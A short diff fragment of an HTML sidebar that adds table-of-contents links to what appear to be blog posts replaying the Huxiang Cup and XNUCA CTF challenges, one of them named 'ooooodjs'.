+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#湖湘杯-amp-xnuca复现"><span class="toc-number">1.</span> <span class="toc-text">湖湘杯&amp;xnuca复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ooooodjs"><span class="toc-number">2.</span> <span class="toc-text">ooooodjs</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
         
     </div>
 </aside>
